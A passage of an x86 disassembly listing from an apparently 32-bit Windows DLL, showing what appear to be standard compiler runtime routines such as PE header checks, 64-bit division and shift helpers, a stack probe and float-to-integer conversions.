1000c43e:	5d                   	pop    %ebp
1000c43f:	c3                   	ret
1000c440:	dd 45 08             	fldl   0x8(%ebp)
1000c443:	d9 ee                	fldz
1000c445:	da e9                	fucompp
1000c447:	df e0                	fnstsw %ax
1000c449:	f6 c4 44             	test   $0x44,%ah
1000c44c:	7a 0c                	jp     0x1000c45a
1000c44e:	f7 d9                	neg    %ecx
1000c450:	1b c9                	sbb    %ecx,%ecx
1000c452:	83 e1 e0             	and    $0xffffffe0,%ecx
1000c455:	8d 41 40             	lea    0x40(%ecx),%eax
1000c458:	5d                   	pop    %ebp
1000c459:	c3                   	ret
1000c45a:	f7 d9                	neg    %ecx
1000c45c:	1b c9                	sbb    %ecx,%ecx
1000c45e:	81 e1 08 ff ff ff    	and    $0xffffff08,%ecx
1000c464:	8d 81 00 01 00 00    	lea    0x100(%ecx),%eax
1000c46a:	5d                   	pop    %ebp
1000c46b:	c3                   	ret
1000c46c:	cc                   	int3
1000c46d:	cc                   	int3
1000c46e:	cc                   	int3
1000c46f:	cc                   	int3
1000c470:	55                   	push   %ebp
1000c471:	8b ec                	mov    %esp,%ebp
1000c473:	8b 45 08             	mov    0x8(%ebp),%eax
1000c476:	33 d2                	xor    %edx,%edx
1000c478:	53                   	push   %ebx
1000c479:	56                   	push   %esi
1000c47a:	57                   	push   %edi
1000c47b:	8b 48 3c             	mov    0x3c(%eax),%ecx
1000c47e:	03 c8                	add    %eax,%ecx
1000c480:	0f b7 41 14          	movzwl 0x14(%ecx),%eax
1000c484:	0f b7 59 06          	movzwl 0x6(%ecx),%ebx
1000c488:	83 c0 18             	add    $0x18,%eax
1000c48b:	03 c1                	add    %ecx,%eax
1000c48d:	85 db                	test   %ebx,%ebx
1000c48f:	74 1b                	je     0x1000c4ac
1000c491:	8b 7d 0c             	mov    0xc(%ebp),%edi
1000c494:	8b 70 0c             	mov    0xc(%eax),%esi
1000c497:	3b fe                	cmp    %esi,%edi
1000c499:	72 09                	jb     0x1000c4a4
1000c49b:	8b 48 08             	mov    0x8(%eax),%ecx
1000c49e:	03 ce                	add    %esi,%ecx
1000c4a0:	3b f9                	cmp    %ecx,%edi
1000c4a2:	72 0a                	jb     0x1000c4ae
1000c4a4:	42                   	inc    %edx
1000c4a5:	83 c0 28             	add    $0x28,%eax
1000c4a8:	3b d3                	cmp    %ebx,%edx
1000c4aa:	72 e8                	jb     0x1000c494
1000c4ac:	33 c0                	xor    %eax,%eax
1000c4ae:	5f                   	pop    %edi
1000c4af:	5e                   	pop    %esi
1000c4b0:	5b                   	pop    %ebx
1000c4b1:	5d                   	pop    %ebp
1000c4b2:	c3                   	ret
1000c4b3:	cc                   	int3
1000c4b4:	cc                   	int3
1000c4b5:	cc                   	int3
1000c4b6:	cc                   	int3
1000c4b7:	cc                   	int3
1000c4b8:	cc                   	int3
1000c4b9:	cc                   	int3
1000c4ba:	cc                   	int3
1000c4bb:	cc                   	int3
1000c4bc:	cc                   	int3
1000c4bd:	cc                   	int3
1000c4be:	cc                   	int3
1000c4bf:	cc                   	int3
1000c4c0:	55                   	push   %ebp
1000c4c1:	8b ec                	mov    %esp,%ebp
1000c4c3:	6a fe                	push   $0xfffffffe
1000c4c5:	68 78 26 01 10       	push   $0x10012678
1000c4ca:	68 70 2a 00 10       	push   $0x10002a70
1000c4cf:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000c4d5:	50                   	push   %eax
1000c4d6:	83 ec 08             	sub    $0x8,%esp
1000c4d9:	53                   	push   %ebx
1000c4da:	56                   	push   %esi
1000c4db:	57                   	push   %edi
1000c4dc:	a1 04 30 01 10       	mov    0x10013004,%eax
1000c4e1:	31 45 f8             	xor    %eax,-0x8(%ebp)
1000c4e4:	33 c5                	xor    %ebp,%eax
1000c4e6:	50                   	push   %eax
1000c4e7:	8d 45 f0             	lea    -0x10(%ebp),%eax
1000c4ea:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
1000c4f0:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000c4f3:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
1000c4fa:	68 00 00 00 10       	push   $0x10000000
1000c4ff:	e8 7c 00 00 00       	call   0x1000c580
1000c504:	83 c4 04             	add    $0x4,%esp
1000c507:	85 c0                	test   %eax,%eax
1000c509:	74 54                	je     0x1000c55f
1000c50b:	8b 45 08             	mov    0x8(%ebp),%eax
1000c50e:	2d 00 00 00 10       	sub    $0x10000000,%eax
1000c513:	50                   	push   %eax
1000c514:	68 00 00 00 10       	push   $0x10000000
1000c519:	e8 52 ff ff ff       	call   0x1000c470
1000c51e:	83 c4 08             	add    $0x8,%esp
1000c521:	85 c0                	test   %eax,%eax
1000c523:	74 3a                	je     0x1000c55f
1000c525:	8b 40 24             	mov    0x24(%eax),%eax
1000c528:	c1 e8 1f             	shr    $0x1f,%eax
1000c52b:	f7 d0                	not    %eax
1000c52d:	83 e0 01             	and    $0x1,%eax
1000c530:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
1000c537:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000c53a:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000c541:	59                   	pop    %ecx
1000c542:	5f                   	pop    %edi
1000c543:	5e                   	pop    %esi
1000c544:	5b                   	pop    %ebx
1000c545:	8b e5                	mov    %ebp,%esp
1000c547:	5d                   	pop    %ebp
1000c548:	c3                   	ret
1000c549:	8b 45 ec             	mov    -0x14(%ebp),%eax
1000c54c:	8b 00                	mov    (%eax),%eax
1000c54e:	33 c9                	xor    %ecx,%ecx
1000c550:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%eax)
1000c556:	0f 94 c1             	sete   %cl
1000c559:	8b c1                	mov    %ecx,%eax
1000c55b:	c3                   	ret
1000c55c:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000c55f:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
1000c566:	33 c0                	xor    %eax,%eax
1000c568:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000c56b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000c572:	59                   	pop    %ecx
1000c573:	5f                   	pop    %edi
1000c574:	5e                   	pop    %esi
1000c575:	5b                   	pop    %ebx
1000c576:	8b e5                	mov    %ebp,%esp
1000c578:	5d                   	pop    %ebp
1000c579:	c3                   	ret
1000c57a:	cc                   	int3
1000c57b:	cc                   	int3
1000c57c:	cc                   	int3
1000c57d:	cc                   	int3
1000c57e:	cc                   	int3
1000c57f:	cc                   	int3
1000c580:	55                   	push   %ebp
1000c581:	8b ec                	mov    %esp,%ebp
1000c583:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000c586:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
1000c58b:	66 39 01             	cmp    %ax,(%ecx)
1000c58e:	75 1f                	jne    0x1000c5af
1000c590:	8b 41 3c             	mov    0x3c(%ecx),%eax
1000c593:	03 c1                	add    %ecx,%eax
1000c595:	81 38 50 45 00 00    	cmpl   $0x4550,(%eax)
1000c59b:	75 12                	jne    0x1000c5af
1000c59d:	b9 0b 01 00 00       	mov    $0x10b,%ecx
1000c5a2:	66 39 48 18          	cmp    %cx,0x18(%eax)
1000c5a6:	75 07                	jne    0x1000c5af
1000c5a8:	b8 01 00 00 00       	mov    $0x1,%eax
1000c5ad:	5d                   	pop    %ebp
1000c5ae:	c3                   	ret
1000c5af:	33 c0                	xor    %eax,%eax
1000c5b1:	5d                   	pop    %ebp
1000c5b2:	c3                   	ret
1000c5b3:	cc                   	int3
1000c5b4:	cc                   	int3
1000c5b5:	cc                   	int3
1000c5b6:	cc                   	int3
1000c5b7:	cc                   	int3
1000c5b8:	cc                   	int3
1000c5b9:	cc                   	int3
1000c5ba:	cc                   	int3
1000c5bb:	cc                   	int3
1000c5bc:	cc                   	int3
1000c5bd:	cc                   	int3
1000c5be:	cc                   	int3
1000c5bf:	cc                   	int3
1000c5c0:	56                   	push   %esi
1000c5c1:	8b 44 24 14          	mov    0x14(%esp),%eax
1000c5c5:	0b c0                	or     %eax,%eax
1000c5c7:	75 28                	jne    0x1000c5f1
1000c5c9:	8b 4c 24 10          	mov    0x10(%esp),%ecx
1000c5cd:	8b 44 24 0c          	mov    0xc(%esp),%eax
1000c5d1:	33 d2                	xor    %edx,%edx
1000c5d3:	f7 f1                	div    %ecx
1000c5d5:	8b d8                	mov    %eax,%ebx
1000c5d7:	8b 44 24 08          	mov    0x8(%esp),%eax
1000c5db:	f7 f1                	div    %ecx
1000c5dd:	8b f0                	mov    %eax,%esi
1000c5df:	8b c3                	mov    %ebx,%eax
1000c5e1:	f7 64 24 10          	mull   0x10(%esp)
1000c5e5:	8b c8                	mov    %eax,%ecx
1000c5e7:	8b c6                	mov    %esi,%eax
1000c5e9:	f7 64 24 10          	mull   0x10(%esp)
1000c5ed:	03 d1                	add    %ecx,%edx
1000c5ef:	eb 47                	jmp    0x1000c638
1000c5f1:	8b c8                	mov    %eax,%ecx
1000c5f3:	8b 5c 24 10          	mov    0x10(%esp),%ebx
1000c5f7:	8b 54 24 0c          	mov    0xc(%esp),%edx
1000c5fb:	8b 44 24 08          	mov    0x8(%esp),%eax
1000c5ff:	d1 e9                	shr    $1,%ecx
1000c601:	d1 db                	rcr    $1,%ebx
1000c603:	d1 ea                	shr    $1,%edx
1000c605:	d1 d8                	rcr    $1,%eax
1000c607:	0b c9                	or     %ecx,%ecx
1000c609:	75 f4                	jne    0x1000c5ff
1000c60b:	f7 f3                	div    %ebx
1000c60d:	8b f0                	mov    %eax,%esi
1000c60f:	f7 64 24 14          	mull   0x14(%esp)
1000c613:	8b c8                	mov    %eax,%ecx
1000c615:	8b 44 24 10          	mov    0x10(%esp),%eax
1000c619:	f7 e6                	mul    %esi
1000c61b:	03 d1                	add    %ecx,%edx
1000c61d:	72 0e                	jb     0x1000c62d
1000c61f:	3b 54 24 0c          	cmp    0xc(%esp),%edx
1000c623:	77 08                	ja     0x1000c62d
1000c625:	72 0f                	jb     0x1000c636
1000c627:	3b 44 24 08          	cmp    0x8(%esp),%eax
1000c62b:	76 09                	jbe    0x1000c636
1000c62d:	4e                   	dec    %esi
1000c62e:	2b 44 24 10          	sub    0x10(%esp),%eax
1000c632:	1b 54 24 14          	sbb    0x14(%esp),%edx
1000c636:	33 db                	xor    %ebx,%ebx
1000c638:	2b 44 24 08          	sub    0x8(%esp),%eax
1000c63c:	1b 54 24 0c          	sbb    0xc(%esp),%edx
1000c640:	f7 da                	neg    %edx
1000c642:	f7 d8                	neg    %eax
1000c644:	83 da 00             	sbb    $0x0,%edx
1000c647:	8b ca                	mov    %edx,%ecx
1000c649:	8b d3                	mov    %ebx,%edx
1000c64b:	8b d9                	mov    %ecx,%ebx
1000c64d:	8b c8                	mov    %eax,%ecx
1000c64f:	8b c6                	mov    %esi,%eax
1000c651:	5e                   	pop    %esi
1000c652:	c2 10 00             	ret    $0x10
1000c655:	cc                   	int3
1000c656:	cc                   	int3
1000c657:	cc                   	int3
1000c658:	cc                   	int3
1000c659:	cc                   	int3
1000c65a:	cc                   	int3
1000c65b:	cc                   	int3
1000c65c:	cc                   	int3
1000c65d:	cc                   	int3
1000c65e:	cc                   	int3
1000c65f:	cc                   	int3
1000c660:	8b 44 24 08          	mov    0x8(%esp),%eax
1000c664:	8b 4c 24 10          	mov    0x10(%esp),%ecx
1000c668:	0b c8                	or     %eax,%ecx
1000c66a:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
1000c66e:	75 09                	jne    0x1000c679
1000c670:	8b 44 24 04          	mov    0x4(%esp),%eax
1000c674:	f7 e1                	mul    %ecx
1000c676:	c2 10 00             	ret    $0x10
1000c679:	53                   	push   %ebx
1000c67a:	f7 e1                	mul    %ecx
1000c67c:	8b d8                	mov    %eax,%ebx
1000c67e:	8b 44 24 08          	mov    0x8(%esp),%eax
1000c682:	f7 64 24 14          	mull   0x14(%esp)
1000c686:	03 d8                	add    %eax,%ebx
1000c688:	8b 44 24 08          	mov    0x8(%esp),%eax
1000c68c:	f7 e1                	mul    %ecx
1000c68e:	03 d3                	add    %ebx,%edx
1000c690:	5b                   	pop    %ebx
1000c691:	c2 10 00             	ret    $0x10
1000c694:	cc                   	int3
1000c695:	cc                   	int3
1000c696:	cc                   	int3
1000c697:	cc                   	int3
1000c698:	cc                   	int3
1000c699:	cc                   	int3
1000c69a:	cc                   	int3
1000c69b:	cc                   	int3
1000c69c:	cc                   	int3
1000c69d:	cc                   	int3
1000c69e:	cc                   	int3
1000c69f:	cc                   	int3
1000c6a0:	57                   	push   %edi
1000c6a1:	56                   	push   %esi
1000c6a2:	55                   	push   %ebp
1000c6a3:	33 ff                	xor    %edi,%edi
1000c6a5:	33 ed                	xor    %ebp,%ebp
1000c6a7:	8b 44 24 14          	mov    0x14(%esp),%eax
1000c6ab:	0b c0                	or     %eax,%eax
1000c6ad:	7d 15                	jge    0x1000c6c4
1000c6af:	47                   	inc    %edi
1000c6b0:	45                   	inc    %ebp
1000c6b1:	8b 54 24 10          	mov    0x10(%esp),%edx
1000c6b5:	f7 d8                	neg    %eax
1000c6b7:	f7 da                	neg    %edx
1000c6b9:	83 d8 00             	sbb    $0x0,%eax
1000c6bc:	89 44 24 14          	mov    %eax,0x14(%esp)
1000c6c0:	89 54 24 10          	mov    %edx,0x10(%esp)
1000c6c4:	8b 44 24 1c          	mov    0x1c(%esp),%eax
1000c6c8:	0b c0                	or     %eax,%eax
1000c6ca:	7d 14                	jge    0x1000c6e0
1000c6cc:	47                   	inc    %edi
1000c6cd:	8b 54 24 18          	mov    0x18(%esp),%edx
1000c6d1:	f7 d8                	neg    %eax
1000c6d3:	f7 da                	neg    %edx
1000c6d5:	83 d8 00             	sbb    $0x0,%eax
1000c6d8:	89 44 24 1c          	mov    %eax,0x1c(%esp)
1000c6dc:	89 54 24 18          	mov    %edx,0x18(%esp)
1000c6e0:	0b c0                	or     %eax,%eax
1000c6e2:	75 28                	jne    0x1000c70c
1000c6e4:	8b 4c 24 18          	mov    0x18(%esp),%ecx
1000c6e8:	8b 44 24 14          	mov    0x14(%esp),%eax
1000c6ec:	33 d2                	xor    %edx,%edx
1000c6ee:	f7 f1                	div    %ecx
1000c6f0:	8b d8                	mov    %eax,%ebx
1000c6f2:	8b 44 24 10          	mov    0x10(%esp),%eax
1000c6f6:	f7 f1                	div    %ecx
1000c6f8:	8b f0                	mov    %eax,%esi
1000c6fa:	8b c3                	mov    %ebx,%eax
1000c6fc:	f7 64 24 18          	mull   0x18(%esp)
1000c700:	8b c8                	mov    %eax,%ecx
1000c702:	8b c6                	mov    %esi,%eax
1000c704:	f7 64 24 18          	mull   0x18(%esp)
1000c708:	03 d1                	add    %ecx,%edx
1000c70a:	eb 47                	jmp    0x1000c753
1000c70c:	8b d8                	mov    %eax,%ebx
1000c70e:	8b 4c 24 18          	mov    0x18(%esp),%ecx
1000c712:	8b 54 24 14          	mov    0x14(%esp),%edx
1000c716:	8b 44 24 10          	mov    0x10(%esp),%eax
1000c71a:	d1 eb                	shr    $1,%ebx
1000c71c:	d1 d9                	rcr    $1,%ecx
1000c71e:	d1 ea                	shr    $1,%edx
1000c720:	d1 d8                	rcr    $1,%eax
1000c722:	0b db                	or     %ebx,%ebx
1000c724:	75 f4                	jne    0x1000c71a
1000c726:	f7 f1                	div    %ecx
1000c728:	8b f0                	mov    %eax,%esi
1000c72a:	f7 64 24 1c          	mull   0x1c(%esp)
1000c72e:	8b c8                	mov    %eax,%ecx
1000c730:	8b 44 24 18          	mov    0x18(%esp),%eax
1000c734:	f7 e6                	mul    %esi
1000c736:	03 d1                	add    %ecx,%edx
1000c738:	72 0e                	jb     0x1000c748
1000c73a:	3b 54 24 14          	cmp    0x14(%esp),%edx
1000c73e:	77 08                	ja     0x1000c748
1000c740:	72 0f                	jb     0x1000c751
1000c742:	3b 44 24 10          	cmp    0x10(%esp),%eax
1000c746:	76 09                	jbe    0x1000c751
1000c748:	4e                   	dec    %esi
1000c749:	2b 44 24 18          	sub    0x18(%esp),%eax
1000c74d:	1b 54 24 1c          	sbb    0x1c(%esp),%edx
1000c751:	33 db                	xor    %ebx,%ebx
1000c753:	2b 44 24 10          	sub    0x10(%esp),%eax
1000c757:	1b 54 24 14          	sbb    0x14(%esp),%edx
1000c75b:	4d                   	dec    %ebp
1000c75c:	79 07                	jns    0x1000c765
1000c75e:	f7 da                	neg    %edx
1000c760:	f7 d8                	neg    %eax
1000c762:	83 da 00             	sbb    $0x0,%edx
1000c765:	8b ca                	mov    %edx,%ecx
1000c767:	8b d3                	mov    %ebx,%edx
1000c769:	8b d9                	mov    %ecx,%ebx
1000c76b:	8b c8                	mov    %eax,%ecx
1000c76d:	8b c6                	mov    %esi,%eax
1000c76f:	4f                   	dec    %edi
1000c770:	75 07                	jne    0x1000c779
1000c772:	f7 da                	neg    %edx
1000c774:	f7 d8                	neg    %eax
1000c776:	83 da 00             	sbb    $0x0,%edx
1000c779:	5d                   	pop    %ebp
1000c77a:	5e                   	pop    %esi
1000c77b:	5f                   	pop    %edi
1000c77c:	c2 10 00             	ret    $0x10
1000c77f:	cc                   	int3
1000c780:	80 f9 40             	cmp    $0x40,%cl
1000c783:	73 15                	jae    0x1000c79a
1000c785:	80 f9 20             	cmp    $0x20,%cl
1000c788:	73 06                	jae    0x1000c790
1000c78a:	0f ad d0             	shrd   %cl,%edx,%eax
1000c78d:	d3 ea                	shr    %cl,%edx
1000c78f:	c3                   	ret
1000c790:	8b c2                	mov    %edx,%eax
1000c792:	33 d2                	xor    %edx,%edx
1000c794:	80 e1 1f             	and    $0x1f,%cl
1000c797:	d3 e8                	shr    %cl,%eax
1000c799:	c3                   	ret
1000c79a:	33 c0                	xor    %eax,%eax
1000c79c:	33 d2                	xor    %edx,%edx
1000c79e:	c3                   	ret
1000c79f:	cc                   	int3
1000c7a0:	51                   	push   %ecx
1000c7a1:	8d 4c 24 04          	lea    0x4(%esp),%ecx
1000c7a5:	2b c8                	sub    %eax,%ecx
1000c7a7:	1b c0                	sbb    %eax,%eax
1000c7a9:	f7 d0                	not    %eax
1000c7ab:	23 c8                	and    %eax,%ecx
1000c7ad:	8b c4                	mov    %esp,%eax
1000c7af:	25 00 f0 ff ff       	and    $0xfffff000,%eax
1000c7b4:	3b c8                	cmp    %eax,%ecx
1000c7b6:	f2 72 0b             	bnd jb 0x1000c7c4
1000c7b9:	8b c1                	mov    %ecx,%eax
1000c7bb:	59                   	pop    %ecx
1000c7bc:	94                   	xchg   %eax,%esp
1000c7bd:	8b 00                	mov    (%eax),%eax
1000c7bf:	89 04 24             	mov    %eax,(%esp)
1000c7c2:	f2 c3                	bnd ret
1000c7c4:	2d 00 10 00 00       	sub    $0x1000,%eax
1000c7c9:	85 00                	test   %eax,(%eax)
1000c7cb:	eb e7                	jmp    0x1000c7b4
1000c7cd:	cc                   	int3
1000c7ce:	cc                   	int3
1000c7cf:	cc                   	int3
1000c7d0:	80 f9 40             	cmp    $0x40,%cl
1000c7d3:	73 15                	jae    0x1000c7ea
1000c7d5:	80 f9 20             	cmp    $0x20,%cl
1000c7d8:	73 06                	jae    0x1000c7e0
1000c7da:	0f a5 c2             	shld   %cl,%eax,%edx
1000c7dd:	d3 e0                	shl    %cl,%eax
1000c7df:	c3                   	ret
1000c7e0:	8b d0                	mov    %eax,%edx
1000c7e2:	33 c0                	xor    %eax,%eax
1000c7e4:	80 e1 1f             	and    $0x1f,%cl
1000c7e7:	d3 e2                	shl    %cl,%edx
1000c7e9:	c3                   	ret
1000c7ea:	33 c0                	xor    %eax,%eax
1000c7ec:	33 d2                	xor    %edx,%edx
1000c7ee:	c3                   	ret
1000c7ef:	cc                   	int3
1000c7f0:	83 3d 68 40 01 10 02 	cmpl   $0x2,0x10014068
1000c7f7:	7c 08                	jl     0x1000c801
1000c7f9:	83 ec 04             	sub    $0x4,%esp
1000c7fc:	db 0c 24             	fisttpl (%esp)
1000c7ff:	58                   	pop    %eax
1000c800:	c3                   	ret
1000c801:	55                   	push   %ebp
1000c802:	8b ec                	mov    %esp,%ebp
1000c804:	83 c4 f0             	add    $0xfffffff0,%esp
1000c807:	83 e4 f0             	and    $0xfffffff0,%esp
1000c80a:	d9 c0                	fld    %st(0)
1000c80c:	db 3c 24             	fstpt  (%esp)
1000c80f:	8b 44 24 04          	mov    0x4(%esp),%eax
1000c813:	0f b7 4c 24 08       	movzwl 0x8(%esp),%ecx
1000c818:	0f ba f1 0f          	btr    $0xf,%ecx
1000c81c:	1b d2                	sbb    %edx,%edx
1000c81e:	66 81 f9 ff 3f       	cmp    $0x3fff,%cx
1000c823:	72 1f                	jb     0x1000c844
1000c825:	85 c0                	test   %eax,%eax
1000c827:	79 36                	jns    0x1000c85f
1000c829:	66 81 f9 1e 40       	cmp    $0x401e,%cx
1000c82e:	73 1c                	jae    0x1000c84c
1000c830:	66 f7 d9             	neg    %cx
1000c833:	66 81 c1 3e 40       	add    $0x403e,%cx
1000c838:	d9 fc                	frndint
1000c83a:	dd d8                	fstp   %st(0)
1000c83c:	d3 e8                	shr    %cl,%eax
1000c83e:	33 c2                	xor    %edx,%eax
1000c840:	2b c2                	sub    %edx,%eax
1000c842:	c9                   	leave
1000c843:	c3                   	ret
1000c844:	d9 fc                	frndint
1000c846:	dd d8                	fstp   %st(0)
1000c848:	33 c0                	xor    %eax,%eax
1000c84a:	c9                   	leave
1000c84b:	c3                   	ret
1000c84c:	77 11                	ja     0x1000c85f
1000c84e:	85 d2                	test   %edx,%edx
1000c850:	79 0d                	jns    0x1000c85f
1000c852:	3d 00 00 00 80       	cmp    $0x80000000,%eax
1000c857:	75 06                	jne    0x1000c85f
1000c859:	d9 fc                	frndint
1000c85b:	dd d8                	fstp   %st(0)
1000c85d:	c9                   	leave
1000c85e:	c3                   	ret
1000c85f:	d8 1d 88 1c 01 10    	fcomps 0x10011c88
1000c865:	c9                   	leave
1000c866:	b8 00 00 00 80       	mov    $0x80000000,%eax
1000c86b:	c3                   	ret
1000c86c:	8d 64 24 00          	lea    0x0(%esp),%esp
1000c870:	83 3d 68 40 01 10 02 	cmpl   $0x2,0x10014068
1000c877:	7c 3e                	jl     0x1000c8b7
1000c879:	d9 ee                	fldz
1000c87b:	df e9                	fucomip %st(1),%st
1000c87d:	7a 2c                	jp     0x1000c8ab
1000c87f:	77 1b                	ja     0x1000c89c
1000c881:	d9 05 80 1c 01 10    	flds   0x10011c80
1000c887:	df e9                	fucomip %st(1),%st
1000c889:	76 20                	jbe    0x1000c8ab
1000c88b:	8b cc                	mov    %esp,%ecx
1000c88d:	83 c4 f8             	add    $0xfffffff8,%esp
1000c890:	83 e4 f8             	and    $0xfffffff8,%esp
1000c893:	dd 0c 24             	fisttpll (%esp)
1000c896:	8b 04 24             	mov    (%esp),%eax
1000c899:	8b e1                	mov    %ecx,%esp
1000c89b:	c3                   	ret
1000c89c:	d9 e1                	fabs
1000c89e:	d9 e8                	fld1
1000c8a0:	df e9                	fucomip %st(1),%st
1000c8a2:	76 07                	jbe    0x1000c8ab
1000c8a4:	db 4c 24 fc          	fisttpl -0x4(%esp)
1000c8a8:	33 c0                	xor    %eax,%eax
1000c8aa:	c3                   	ret
1000c8ab:	d8 1d 88 1c 01 10    	fcomps 0x10011c88
1000c8b1:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
1000c8b6:	c3                   	ret
1000c8b7:	55                   	push   %ebp
1000c8b8:	8b ec                	mov    %esp,%ebp
1000c8ba:	83 c4 f0             	add    $0xfffffff0,%esp
1000c8bd:	83 e4 f0             	and    $0xfffffff0,%esp
1000c8c0:	d9 c0                	fld    %st(0)
1000c8c2:	db 3c 24             	fstpt  (%esp)
1000c8c5:	8b 44 24 04          	mov    0x4(%esp),%eax
1000c8c9:	0f b7 4c 24 08       	movzwl 0x8(%esp),%ecx
1000c8ce:	0f ba f1 0f          	btr    $0xf,%ecx
1000c8d2:	72 22                	jb     0x1000c8f6
1000c8d4:	66 81 f9 ff 3f       	cmp    $0x3fff,%cx
1000c8d9:	72 22                	jb     0x1000c8fd
1000c8db:	85 c0                	test   %eax,%eax
1000c8dd:	79 26                	jns    0x1000c905
1000c8df:	66 81 f9 1f 40       	cmp    $0x401f,%cx
1000c8e4:	73 1f                	jae    0x1000c905
1000c8e6:	66 f7 d9             	neg    %cx
1000c8e9:	66 81 c1 3e 40       	add    $0x403e,%cx
1000c8ee:	d9 fc                	frndint
1000c8f0:	dd d8                	fstp   %st(0)
1000c8f2:	d3 e8                	shr    %cl,%eax
1000c8f4:	c9                   	leave
1000c8f5:	c3                   	ret
1000c8f6:	66 81 f9 ff 3f       	cmp    $0x3fff,%cx
1000c8fb:	73 08                	jae    0x1000c905
1000c8fd:	d9 fc                	frndint
1000c8ff:	dd d8                	fstp   %st(0)
1000c901:	33 c0                	xor    %eax,%eax
1000c903:	c9                   	leave
1000c904:	c3                   	ret
1000c905:	d8 1d 88 1c 01 10    	fcomps 0x10011c88
1000c90b:	c9                   	leave
1000c90c:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
1000c911:	c3                   	ret
1000c912:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
1000c919:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
1000c920:	83 3d 68 40 01 10 02 	cmpl   $0x2,0x10014068
1000c927:	7c 15                	jl     0x1000c93e
1000c929:	8b cc                	mov    %esp,%ecx
1000c92b:	83 c4 f8             	add    $0xfffffff8,%esp
1000c92e:	83 e4 f8             	and    $0xfffffff8,%esp
1000c931:	dd 0c 24             	fisttpll (%esp)
1000c934:	8b 04 24             	mov    (%esp),%eax
1000c937:	8b 54 24 04          	mov    0x4(%esp),%edx
1000c93b:	8b e1                	mov    %ecx,%esp
1000c93d:	c3                   	ret
1000c93e:	55                   	push   %ebp
1000c93f:	8b ec                	mov    %esp,%ebp
1000c941:	83 c4 f0             	add    $0xfffffff0,%esp
1000c944:	83 e4 f0             	and    $0xfffffff0,%esp
1000c947:	d9 c0                	fld    %st(0)
1000c949:	db 3c 24             	fstpt  (%esp)
1000c94c:	8b 04 24             	mov    (%esp),%eax
1000c94f:	8b 54 24 04          	mov    0x4(%esp),%edx
1000c953:	0f b7 4c 24 08       	movzwl 0x8(%esp),%ecx
1000c958:	0f ba f1 0f          	btr    $0xf,%ecx
1000c95c:	66 81 f9 ff 3f       	cmp    $0x3fff,%cx
1000c961:	72 36                	jb     0x1000c999
1000c963:	85 d2                	test   %edx,%edx
1000c965:	79 55                	jns    0x1000c9bc
1000c967:	66 81 f9 3e 40       	cmp    $0x403e,%cx
1000c96c:	73 35                	jae    0x1000c9a3
1000c96e:	66 f7 d9             	neg    %cx
1000c971:	66 81 c1 3e 40       	add    $0x403e,%cx
1000c976:	d9 fc                	frndint
1000c978:	dd d8                	fstp   %st(0)
1000c97a:	80 f9 20             	cmp    $0x20,%cl
1000c97d:	72 04                	jb     0x1000c983
1000c97f:	8b c2                	mov    %edx,%eax
1000c981:	33 d2                	xor    %edx,%edx
1000c983:	0f ad d0             	shrd   %cl,%edx,%eax
1000c986:	d3 ea                	shr    %cl,%edx
1000c988:	66 83 7c 24 08 00    	cmpw   $0x0,0x8(%esp)
1000c98e:	7d 07                	jge    0x1000c997
1000c990:	f7 d8                	neg    %eax
1000c992:	83 d2 00             	adc    $0x0,%edx
1000c995:	f7 da                	neg    %edx
1000c997:	c9                   	leave
1000c998:	c3                   	ret
1000c999:	d9 fc                	frndint
1000c99b:	dd d8                	fstp   %st(0)
1000c99d:	33 c0                	xor    %eax,%eax
1000c99f:	33 d2                	xor    %edx,%edx
1000c9a1:	c9                   	leave
1000c9a2:	c3                   	ret
1000c9a3:	8d 0c 55 00 00 00 00 	lea    0x0(,%edx,2),%ecx
1000c9aa:	77 10                	ja     0x1000c9bc
1000c9ac:	0b c8                	or     %eax,%ecx
1000c9ae:	75 0c                	jne    0x1000c9bc
1000c9b0:	66 83 7c 24 08 00    	cmpw   $0x0,0x8(%esp)
1000c9b6:	7d 04                	jge    0x1000c9bc
1000c9b8:	dd d8                	fstp   %st(0)
1000c9ba:	c9                   	leave
1000c9bb:	c3                   	ret
1000c9bc:	d8 1d 88 1c 01 10    	fcomps 0x10011c88
1000c9c2:	c9                   	leave
1000c9c3:	ba 00 00 00 80       	mov    $0x80000000,%edx
1000c9c8:	33 c0                	xor    %eax,%eax
1000c9ca:	c3                   	ret
1000c9cb:	eb 03                	jmp    0x1000c9d0
1000c9cd:	cc                   	int3
1000c9ce:	cc                   	int3
1000c9cf:	cc                   	int3
1000c9d0:	83 3d 68 40 01 10 02 	cmpl   $0x2,0x10014068
1000c9d7:	7c 43                	jl     0x1000ca1c
1000c9d9:	d9 ee                	fldz
1000c9db:	df e9                	fucomip %st(1),%st
1000c9dd:	7a 30                	jp     0x1000ca0f
1000c9df:	77 1f                	ja     0x1000ca00
1000c9e1:	d9 05 84 1c 01 10    	flds   0x10011c84
1000c9e7:	df e9                	fucomip %st(1),%st
1000c9e9:	76 31                	jbe    0x1000ca1c
1000c9eb:	8b cc                	mov    %esp,%ecx
1000c9ed:	83 c4 f8             	add    $0xfffffff8,%esp
1000c9f0:	83 e4 f8             	and    $0xfffffff8,%esp
1000c9f3:	dd 0c 24             	fisttpll (%esp)
1000c9f6:	8b 04 24             	mov    (%esp),%eax
1000c9f9:	8b 54 24 04          	mov    0x4(%esp),%edx
1000c9fd:	8b e1                	mov    %ecx,%esp
1000c9ff:	c3                   	ret
1000ca00:	d9 e1                	fabs
1000ca02:	d9 e8                	fld1
1000ca04:	df e9                	fucomip %st(1),%st
1000ca06:	76 07                	jbe    0x1000ca0f
1000ca08:	db 4c 24 fc          	fisttpl -0x4(%esp)
